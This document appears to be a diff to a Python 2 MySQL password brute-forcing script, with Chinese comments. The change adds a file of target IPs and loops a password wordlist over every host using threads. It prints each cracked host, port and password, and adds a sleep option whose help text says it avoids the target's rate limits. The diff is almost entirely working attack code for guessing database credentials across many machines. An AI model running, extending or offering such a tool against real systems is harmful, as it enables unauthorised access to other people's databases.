@@ -34,20 +34,25 @@ print u'''
 '''   
 
 parser = argparse.ArgumentParser()
-parser.add_argument('-hh', '--host', help=u"主机IP,必输")
-parser.add_argument('-p', '--port', help=u"mysql端口,非必输", default=3306, type=int)
+#parser.add_argument('-hh', '--host', help=u"主机IP,必输")
+parser.add_argument('-p', '--port', help=u"mysql端口,看清楚 这里是非必输", default=3306, type=int)
 parser.add_argument('-t', '--threads', help=u"线程数,这里不要设置太多,有可能会导致后面不能正常连接数据库" , default=5, type=int)
 parser.add_argument('-n', '--name', help=u"用户名" , default='root')
-parser.add_argument('-f', '--filepath', help=u"文件路径,必输")
+parser.add_argument('-f', '--filepath', help=u"密码文件路径,必输")
+parser.add_argument('-H', '--ipfilepath', help=u"ip文件路径,必输")
 parser.add_argument('-db', '--databasename', help=u"要连接的数据库名" , default='information_schema')
 parser.add_argument('-s', '--sleep', help=u"休眠时间,防止访问频繁被对方限制" , default=0,type=int)
+
+
 
 args = parser.parse_args()
 
 # 主机IP
-host = args.host
+#host = args.host
 # mysql端口号
 port = args.port
+# ip地址文件路径
+ipfilepath =  args.ipfilepath
 # 开启线程数
 threadCount = args.threads
 # 数据库用户
@@ -59,8 +64,6 @@ filepath = args.filepath
 databasename = args.databasename
 
 sleeptime = 0.01
-print str(type(host)) ==str('NoneType')
-print type(host) == 'NoneType'
 # 判断主机是否输入
 # if str(type(host)) == 'NoneType':
 #     print u"请输入IP地址"
@@ -77,7 +80,11 @@ def getconn(host,port,username,pwd,databasename):
 #     print '进入到线程中'
     try:
         pymysql.connect(host=host, port=port, user=username, password=pwd, db=databasename, charset='utf8mb4', autocommit=True, cursorclass=pymysql.cursors.DictCursor)
-        print u'密码破解成功 : ',pwd
+        print u'密码破解成功 : \n',pwd
+        print u'主机IP:',host
+        print u'连接端口: ',port
+        print u'密码: ',pwd
+        
         # 破解成功
         FLAG = False
     except Exception ,es:
@@ -110,7 +117,14 @@ def beforethread(host,port,username,s,databasename):
 #             getconn(host,port,username,s,databasename)
     except Exception,es:
         print str(es)  
-        
+with open(ipfilepath,'r') as ips:
+    pass  
+
+    ip = ips.read()
+    # 获取所有的ip地址
+    ips = ip.split('\n')
+
+          
          
 with open(filepath,'r') as f:
     
@@ -120,16 +134,18 @@ with open(filepath,'r') as f:
     pwd = f.read()
     pwds = pwd.split('\n')
     x = 0
-    for s in pwds:
-        if FLAG:
-            x =x + 1
-            print u'当前个数: '+str(x)
-            print u'当前密码: '+s
-            if threadNum<threadCount:
-                beforethread(host,port,username,s,databasename)
-            else:
-                time.sleep(0.1)
-                beforethread(host,port,username,s,databasename)
-    
-    print '%d second'% (time.time()-start_time)
+    print ips
+    for host in ips:
+        for s in pwds:
+            if FLAG:
+                x =x + 1
+                print u'第: '+str(x)+u'个 '
+                print u'当前密码: '+s
+                if threadNum<threadCount:
+                    beforethread(host,port,username,s,databasename)
+                else:
+                    time.sleep(0.1)
+                    beforethread(host,port,username,s,databasename)
+        
+    print u'共耗时 :%d 秒'% (time.time()-start_time)
 
